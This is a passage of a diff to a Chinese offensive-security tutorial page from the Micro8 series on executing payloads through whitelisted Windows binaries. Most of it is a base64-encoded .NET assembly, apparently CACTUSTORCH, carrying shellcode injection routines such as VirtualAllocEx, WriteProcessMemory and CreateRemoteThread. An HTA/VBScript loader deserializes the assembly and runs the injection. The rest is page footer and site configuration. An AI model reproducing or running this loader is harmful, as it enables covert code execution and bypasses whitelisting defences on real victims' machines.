+s = s &amp; &quot;AABtBAAASQA8AAoAAgEAAPMGAABJAEUACgAGAH0G+gAGAEQHPwAGACQE/QAGAHQIPwAGAOcDPwAG&quot;
+s = s &amp; &quot;AMgD+gAGAL0D+gAGBp4DAAFWgLICAwFWgMACAwFWgGQAAwFWgIgCAwFWgMIAAwFWgFMCAwFWgPEB&quot;
+s = s &amp; &quot;AwFWgB0CAwFWgAUCAwFWgKABAwFWgAIDAwFWgF4BAwFWgEgBAwFWgOEBAwFWgE0CAwFWgDECAwFW&quot;
+s = s &amp; &quot;gGoDAwFWgIIDAwFWgJkCAwFWgB0DAwFWgHYBAwFWgHUAAwFWgD0AAwFWgCcBAwFWgKgAAwFWgDoD&quot;
+s = s &amp; &quot;AwFWgLkBAwFWgBgBAwFWgMYBAwFWgOUCAwEGBp4DAAFWgJEABwFWgHICBwEGAKYD+gAGAO8DPwAG&quot;
+s = s &amp; &quot;ABcHPwAGADMEPwAGAEsD+gAGAJoD+gAGAOcF+gAGAO8F+gAGAEcI+gAGAFUI+gAGAOQE+gAGAC4I&quot;
+s = s &amp; &quot;+gAGAOcICwEGAA0ACwEGABkAPwAGANIIPwAGANwIPwAGADQHPwAGBp4DAAFWgN4CDgFWgO8ADgFW&quot;
+s = s &amp; &quot;gJ0BDgFWgNgCDgFWgNUBDgFWgA8BDgFWgJQBDgFWgAMBDgEGBp4DAAFWgOcAEgFWgFcAEgFWgNUA&quot;
+s = s &amp; &quot;EgFWgFgDEgFWgGkCEgFWgE8DEgFWgN0AEgFWgGADEgFWgBEGEgFWgCQGEgFWgDkGEgEAAAAAgACW&quot;
+s = s &amp; &quot;IC4AFgEBAAAAAACAAJYg8wgqAQsAAAAAAIAAliAJCTUBEAAAAAAAgACWIGMIPwEVAAAAAACAAJEg&quot;
+s = s &amp; &quot;1ANFARcAUCAAAAAAhhg+BwYAHgBYIAAAAACGAE0EUAEeAGshAAAAAIYYPgcGACAAjCEAAAAAhhg+&quot;
+s = s &amp; &quot;BwYAIAAAAAEAOwQAAAIAUwQAAAMA5AcAAAQA0QcAAAUAwQcAAAYACwgAAAcAvAgAAAgAHAkBAAkA&quot;
+s = s &amp; &quot;BAcCAAoAzAYAAAEAGwQAAAIAiwgAAAMAAwYAAAQAawQAAAUAsggAAAEAdAgAAAIAfQgAAAMAIQcA&quot;
+s = s &amp; &quot;AAQAAwYAAAUAtQYAAAEAdAgAAAIA+gMAAAEAdAgAAAIA0QcAAAMA9wUAAAQAlQgAAAUAKAcAAAYA&quot;
+s = s &amp; &quot;CwgAAAcAsgMAAAEAAgkAAAIAAQAJAD4HAQARAD4HBgAZAD4HCgApAD4HEAAxAD4HEAA5AD4HEABB&quot;
+s = s &amp; &quot;AD4HEABJAD4HEABRAD4HEABZAD4HEABhAD4HFQBpAD4HEABxAD4HEACJAD4HBgB5AD4HBgCZAFMG&quot;
+s = s &amp; &quot;KQChAD4HAQCpAAQELwCxAHkGNACxAKQIOAChABIHPwChAGQGQgCxADsJRgCxAC8JRgC5AAoGTAAJ&quot;
+s = s &amp; &quot;ACQAWgAJACgAXwAJACwAZAAJADAAaQAJADQAbgAJADgAcwAJADwAeAAJAEAAfQAJAEQAggAJAEgA&quot;
+s = s &amp; &quot;hwAJAEwAjAAJAFAAkQAJAFQAlgAJAFgAmwAJAFwAoAAJAGAApQAJAGQAqgAJAGgArwAJAGwAtAAJ&quot;
+s = s &amp; &quot;AHAAuQAJAHQAvgAJAHgAwwAJAHwAyAAJAIAAzQAJAIQA0gAJAIgA1wAJAIwA3AAJAJAA4QAJAJQA&quot;
+s = s &amp; &quot;5gAJAJgA6wAJAKAAWgAJAKQAXwAJAPQAlgAJAPgAmwAJAPwA8AAJAAABuQAJAAQB4QAJAAgB9QAJ&quot;
+s = s &amp; &quot;AAwBvgAJABABwwAJABgBbgAJABwBcwAJACABeAAJACQBfQAJACgBWgAJACwBXwAJADABZAAJADQB&quot;
+s = s &amp; &quot;aQAJADgBggAJADwBhwAJAEABjAAuAAsAVgEuABMAXwEuABsAfgEuACMAhwEuACsAhwEuADMAmAEu&quot;
+s = s &amp; &quot;ADsAmAEuAEMAhwEuAEsAhwEuAFMAmAEuAFsAngEuAGMApAEuAGsAzgFDAFsAngGjAHMAWgDDAHMA&quot;
+s = s &amp; &quot;WgADAXMAWgAjAXMAWgAaAIwGAAEDAC4AAQAAAQUA8wgBAAABBwAJCQEAAAEJAGMIAQAAAQsA1AMB&quot;
+s = s &amp; &quot;AASAAAABAAAAAAAAAAAAAAAAAPcAAAACAAAAAAAAAAAAAABRAKkDAAAAAAMAAgAEAAIABQACAAYA&quot;
+s = s &amp; &quot;AgAHAAIACAACAAkAAgAAAAAAAHNoZWxsY29kZTMyAGNiUmVzZXJ2ZWQyAGxwUmVzZXJ2ZWQyADxN&quot;
+s = s &amp; &quot;b2R1bGU+AENyZWF0ZVByb2Nlc3NBAENSRUFURV9CUkVBS0FXQVlfRlJPTV9KT0IARVhFQ1VURV9S&quot;
+s = s &amp; &quot;RUFEAENSRUFURV9TVVNQRU5ERUQAUFJPQ0VTU19NT0RFX0JBQ0tHUk9VTkRfRU5EAERVUExJQ0FU&quot;
+s = s &amp; &quot;RV9DTE9TRV9TT1VSQ0UAQ1JFQVRFX0RFRkFVTFRfRVJST1JfTU9ERQBDUkVBVEVfTkVXX0NPTlNP&quot;
+s = s &amp; &quot;TEUARVhFQ1VURV9SRUFEV1JJVEUARVhFQ1VURQBSRVNFUlZFAENBQ1RVU1RPUkNIAFdSSVRFX1dB&quot;
+s = s &amp; &quot;VENIAFBIWVNJQ0FMAFBST0ZJTEVfS0VSTkVMAENSRUFURV9QUkVTRVJWRV9DT0RFX0FVVEhaX0xF&quot;
+s = s &amp; &quot;VkVMAENSRUFURV9TSEFSRURfV09XX1ZETQBDUkVBVEVfU0VQQVJBVEVfV09XX1ZETQBQUk9DRVNT&quot;
+s = s &amp; &quot;X01PREVfQkFDS0dST1VORF9CRUdJTgBUT1BfRE9XTgBHTwBDUkVBVEVfTkVXX1BST0NFU1NfR1JP&quot;
+s = s &amp; &quot;VVAAUFJPRklMRV9VU0VSAFBST0ZJTEVfU0VSVkVSAExBUkdFX1BBR0VTAENSRUFURV9GT1JDRURP&quot;
+s = s &amp; &quot;UwBJRExFX1BSSU9SSVRZX0NMQVNTAFJFQUxUSU1FX1BSSU9SSVRZX0NMQVNTAEhJR0hfUFJJT1JJ&quot;
+s = s &amp; &quot;VFlfQ0xBU1MAQUJPVkVfTk9STUFMX1BSSU9SSVRZX0NMQVNTAEJFTE9XX05PUk1BTF9QUklPUklU&quot;
+s = s &amp; &quot;WV9DTEFTUwBOT0FDQ0VTUwBEVVBMSUNBVEVfU0FNRV9BQ0NFU1MAREVUQUNIRURfUFJPQ0VTUwBD&quot;
+s = s &amp; &quot;UkVBVEVfUFJPVEVDVEVEX1BST0NFU1MAREVCVUdfUFJPQ0VTUwBERUJVR19PTkxZX1RISVNfUFJP&quot;
+s = s &amp; &quot;Q0VTUwBSRVNFVABDT01NSVQAQ1JFQVRFX0lHTk9SRV9TWVNURU1fREVGQVVMVABDUkVBVEVfVU5J&quot;
+s = s &amp; &quot;Q09ERV9FTlZJUk9OTUVOVABFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UAENSRUFURV9OT19X&quot;
+s = s &amp; &quot;SU5ET1cAZHdYAFJFQURPTkxZAEVYRUNVVEVfV1JJVEVDT1BZAElOSEVSSVRfUEFSRU5UX0FGRklO&quot;
+s = s &amp; &quot;SVRZAElOSEVSSVRfQ0FMTEVSX1BSSU9SSVRZAGR3WQB2YWx1ZV9fAGNiAG1zY29ybGliAGxwVGhy&quot;
+s = s &amp; &quot;ZWFkSWQAZHdUaHJlYWRJZABkd1Byb2Nlc3NJZABDcmVhdGVSZW1vdGVUaHJlYWQAaFRocmVhZABs&quot;
+s = s &amp; &quot;cFJlc2VydmVkAHVFeGl0Q29kZQBHZXRFbnZpcm9ubWVudFZhcmlhYmxlAGxwSGFuZGxlAGJJbmhl&quot;
+s = s &amp; &quot;cml0SGFuZGxlAGxwVGl0bGUAbHBBcHBsaWNhdGlvbk5hbWUAZmxhbWUAbHBDb21tYW5kTGluZQBW&quot;
+s = s &amp; &quot;YWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1&quot;
+s = s &amp; &quot;dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJh&quot;
+s = s &amp; &quot;ZGVtYXJrQXR0cmlidXRlAGR3RmlsbEF0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmli&quot;
+s = s &amp; &quot;dXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0&quot;
+s = s &amp; &quot;cmlidXRlAEZsYWdzQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNz&quot;
+s = s &amp; &quot;ZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5&quot;
+s = s &amp; &quot;Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBkd1hTaXplAGR3&quot;
+s = s &amp; &quot;WVNpemUAZHdTdGFja1NpemUAZHdTaXplAFNpemVPZgBHVUFSRF9Nb2RpZmllcmZsYWcATk9DQUNI&quot;
+s = s &amp; &quot;RV9Nb2RpZmllcmZsYWcAV1JJVEVDT01CSU5FX01vZGlmaWVyZmxhZwBGcm9tQmFzZTY0U3RyaW5n&quot;
+s = s &amp; &quot;AFRvU3RyaW5nAGNhY3R1c1RvcmNoAGdldF9MZW5ndGgATWFyc2hhbABrZXJuZWwzMi5kbGwAQ0FD&quot;
+s = s &amp; &quot;VFVTVE9SQ0guZGxsAFN5c3RlbQBFbnVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AbHBQcm9jZXNz&quot;
+s = s &amp; &quot;SW5mb3JtYXRpb24AU3lzdGVtLlJlZmxlY3Rpb24ATWVtb3J5UHJvdGVjdGlvbgBscFN0YXJ0dXBJ&quot;
+s = s &amp; &quot;bmZvAFplcm8AbHBEZXNrdG9wAGJ1ZmZlcgBscFBhcmFtZXRlcgBoU3RkRXJyb3IALmN0b3IAbHBT&quot;
+s = s &amp; &quot;ZWN1cml0eURlc2NyaXB0b3IASW50UHRyAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGlt&quot;
+s = s &amp; &quot;ZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dp&quot;
+s = s &amp; &quot;bmdNb2RlcwBiSW5oZXJpdEhhbmRsZXMAbHBUaHJlYWRBdHRyaWJ1dGVzAGxwUHJvY2Vzc0F0dHJp&quot;
+s = s &amp; &quot;YnV0ZXMAU2VjdXJpdHlBdHRyaWJ1dGVzAGR3Q3JlYXRpb25GbGFncwBDcmVhdGVQcm9jZXNzRmxh&quot;
+s = s &amp; &quot;Z3MAZHdGbGFncwBEdXBsaWNhdGVPcHRpb25zAGR3WENvdW50Q2hhcnMAZHdZQ291bnRDaGFycwBU&quot;
+s = s &amp; &quot;ZXJtaW5hdGVQcm9jZXNzAGhQcm9jZXNzAGxwQmFzZUFkZHJlc3MAbHBBZGRyZXNzAGxwU3RhcnRB&quot;
+s = s &amp; &quot;ZGRyZXNzAENvbmNhdABPYmplY3QAZmxQcm90ZWN0AGxwRW52aXJvbm1lbnQAQ29udmVydABoU3Rk&quot;
+s = s &amp; &quot;SW5wdXQAaFN0ZE91dHB1dAB3U2hvd1dpbmRvdwBWaXJ0dWFsQWxsb2NFeABiaW5hcnkAV3JpdGVQ&quot;
+s = s &amp; &quot;cm9jZXNzTWVtb3J5AGxwQ3VycmVudERpcmVjdG9yeQBvcF9FcXVhbGl0eQBvcF9JbmVxdWFsaXR5&quot;
+s = s &amp; &quot;AAAAAAABABlQAHIAbwBnAHIAYQBtAFcANgA0ADMAMgAADXcAaQBuAGQAaQByAAAVXABTAHkAcwBX&quot;
+s = s &amp; &quot;AE8AVwA2ADQAXAAAFVwAUwB5AHMAdABlAG0AMwAyAFwAAAMwAAAARY+bzuLqxE+aSSAzLsphXgAE&quot;
+s = s &amp; &quot;IAEBCAMgAAEFIAEBEREEIAEBDgQgAQECDgcJHQUYEhwREA4YGAgYBQABHQUOBAABDg4DIAAIBgAD&quot;
+s = s &amp; &quot;Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE&quot;
+s = s &amp; &quot;IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA&quot;
+s = s &amp; &quot;AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg&quot;
+s = s &amp; &quot;BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS&quot;
+s = s &amp; &quot;DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB&quot;
+s = s &amp; &quot;AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT&quot;
+s = s &amp; &quot;VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3&quot;
+s = s &amp; &quot;NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA&quot;
+s = s &amp; &quot;ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A&quot;
+s = s &amp; &quot;VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA&quot;
+s = s &amp; &quot;AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA&quot;
+s = s &amp; &quot;BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs&quot;
+s = s &amp; &quot;AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA&quot;
+s = s &amp; &quot;cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA&quot;
+s = s &amp; &quot;AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA&quot;
+s = s &amp; &quot;UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu&quot;
+s = s &amp; &quot;ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA&quot;
+s = s &amp; &quot;SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV&quot;
+s = s &amp; &quot;AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA&quot;
+s = s &amp; &quot;AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP&quot;
+s = s &amp; &quot;AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA&quot;
+s = s &amp; &quot;VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw&quot;
+s = s &amp; &quot;AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA&quot;
+s = s &amp; &quot;LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+s = s &amp; &quot;AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv&quot;
+s = s &amp; &quot;bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA&quot;
+entry_class = &quot;cactusTorch&quot;</p>
+<p>Dim fmt, al, d, o
+Set fmt = CreateObject(&quot;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&quot;)
+Set al = CreateObject(&quot;System.Collections.ArrayList&quot;)
+al.Add fmt.SurrogateSelector</p>
+<p>Set d = fmt.Deserialize_2(Base64ToStream(s))
+Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
+o.flame binary,code
+End Sub</p>
+<p>SetVersion
+On Error Resume Next
 Run
-<span class="token keyword">If</span> Err<span class="token punctuation">.</span>Number <span class="token operator">&lt;</span><span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token keyword">Then</span>
-Debug Err<span class="token punctuation">.</span>Description
-Err<span class="token punctuation">.</span>Clear
-<span class="token keyword">End</span> <span class="token keyword">If</span> 
-
-self<span class="token punctuation">.</span>close
-<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
-</code></pre>
+If Err.Number &lt;&gt; 0 Then
+Debug Err.Description
+Err.Clear
+End If</p>
+<p>self.close
+&lt;/script&gt;
+```</p>
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-<footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> Copyright &#xA9; 2019 Micro8. All Rights Reserved. &#x9075;&#x5FAA; <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh" target="_blank">&#x77E5;&#x8BC6;&#x5171;&#x4EAB; &#x7F72;&#x540D;-&#x975E;&#x5546;&#x4E1A;&#x6027;&#x4F7F;&#x7528; 4.0 &#x534F;&#x8BAE;&#x53D1;&#x5E03;</a> </span> &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; <span class="page-footer-ex-footer-update"> &#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A; 2019-02-25 </span> </footer>
+<footer class="page-footer-ex"> <span class="page-footer-ex-copyright"> Copyright © 2019 Micro8. All Rights Reserved. 遵循 <a href="https://creativecommons.org/licenses/by-nc/4.0/deed.zh">知识共享 署名-非商业性使用 4.0 协议发布</a> </span> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <span class="page-footer-ex-footer-update"> 修订时间： 2019-03-03 </span> </footer></script>
                                 
                                 </section>
                             
@@ -2201,7 +2198,7 @@ self<span class="token punctuation">.</span>close
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第八十九课：基于白名单Url.dll执行payload第十七季","level":"1.4.89","depth":2,"next":{"title":"第九十课：基于白名单zipfldr.dll执行payload第十八季","level":"1.4.90","depth":2,"path":"Chapter1/81-90/90_基于白名单zipfldr.dll执行payload第十八季.md","ref":"Chapter1/81-90/90_基于白名单zipfldr.dll执行payload第十八季.md","articles":[]},"previous":{"title":"第八十八课：基于白名单Ftp.exe执行payload第十九季","level":"1.4.88","depth":2,"path":"Chapter1/81-90/88_基于白名单Ftp.exe执行payload第十九季.md","ref":"Chapter1/81-90/88_基于白名单Ftp.exe执行payload第十九季.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","-sharing","sharing-plus","expandable-chapters-small","theme-comscore","splitter","github-buttons","page-footer-ex","anchors","anchor-navigation-ex","donate","ad","baidu-tongji","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"ad":{"contentBottom":"","contentTop":"<font size=\"6\"> 专注 APT 攻击与防御 </font>"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"b03e1a3682665e9218213dc9e1b5a428"},"page-footer-ex":{"copyright":"Copyright © 2019 Micro8. All Rights Reserved. 遵循 [知识共享 署名-非商业性使用 4.0 协议发布](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)","markdown":true,"update_format":"YYYY-MM-DD","update_label":"修订时间："},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-anchor","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":true},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"github-buttons":{"buttons":[{"user":"micro8","repo":"Micro8-HTML","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon","douban"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 系列教程","language":"zh-hans","links":{"sidebar":{"Micropoor":"https://micropoor.blogspot.com","Github Micro8":"https://github.com/micro8"}},"gitbook":"*","description":"Micro8"},"file":{"path":"Chapter1/81-90/89_基于白名单Url.dll执行payload第十七季.md","mtime":"2019-02-25T12:48:22.839Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-03-01T13:38:56.930Z"},"basePath":"../..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第八十九课：基于白名单Url.dll执行payload第十七季","level":"1.4.89","depth":2,"next":{"title":"第九十课：基于白名单zipfldr.dll执行payload第十八季","level":"1.4.90","depth":2,"path":"Chapter1/81-90/90_基于白名单zipfldr.dll执行payload第十八季.md","ref":"Chapter1/81-90/90_基于白名单zipfldr.dll执行payload第十八季.md","articles":[]},"previous":{"title":"第八十八课：基于白名单Ftp.exe执行payload第十九季","level":"1.4.88","depth":2,"path":"Chapter1/81-90/88_基于白名单Ftp.exe执行payload第十九季.md","ref":"Chapter1/81-90/88_基于白名单Ftp.exe执行payload第十九季.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","sharing","expandable-chapters-small","theme-comscore","splitter","github-buttons","page-footer-ex","anchors","anchor-navigation-ex","donate","terminal","ad","baidu-tongji","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prism-themes/themes/prism-atom-dark.css"]},"ad":{"contentBottom":"","contentTop":"<font size=\"6\"> 专注 APT 攻击与防御 </font>"},"baidu-tongji":{"url":"https://hm.baidu.com/hm.js","token":"b03e1a3682665e9218213dc9e1b5a428"},"page-footer-ex":{"copyright":"Copyright © 2019 Micro8. All Rights Reserved. 遵循 [知识共享 署名-非商业性使用 4.0 协议发布](https://creativecommons.org/licenses/by-nc/4.0/deed.zh)","markdown":true,"update_format":"YYYY-MM-DD","update_label":"修订时间："},"splitter":{},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-anchor","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":true},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"theme-comscore":{},"github-buttons":{"buttons":[{"user":"micro8","repo":"Micro8-HTML","type":"star","size":"small","count":true}]},"expandable-chapters-small":{},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"all":["facebook","google","twitter","weibo","instapaper"],"facebook":true,"google":false,"instapaper":false,"twitter":true,"vk":false,"weibo":false},"terminal":{"copyButtons":true,"fade":false,"style":"flat"},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"search-plus":{}},"theme":"default","author":"Micro8 系列作者","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Micro8 